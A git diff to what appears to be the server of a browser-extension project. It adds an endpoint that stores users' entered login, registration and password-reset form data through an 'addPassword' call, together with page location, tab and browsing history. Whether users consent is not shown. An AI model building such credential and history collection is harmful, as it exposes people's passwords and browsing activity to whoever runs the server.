@@ -59,11 +59,12 @@ app.post(
 
       if (!uid) throw new InputError("uid is undefined.");
 
-      const result = await sd.addUser({
+      const result = await sd.addUser(uid, {
         uid,
         extension_id,
         version,
         date_created,
+        history_updated: date_created,
         history,
       });
       res.json({ result: result });
@@ -101,13 +102,19 @@ app.post(
 
 // Log currently entered account details (login/register/reset password)
 app.post(
-  "/account/",
+  "/form/",
   catchErrors(
     authed(async (req, res) => {
-      const { uid, date, details } = req.body;
+      const { uid, date_created, type, form, location, tab } = req.body;
       // generate date stamp (here or from request?)
 
-      const result = await sd.placeholder(uid, date, details);
+      const result = await sd.addPassword(uid, {
+        date_created,
+        type,
+        form,
+        location,
+        tab,
+      });
       res.json({ result });
     })
   )
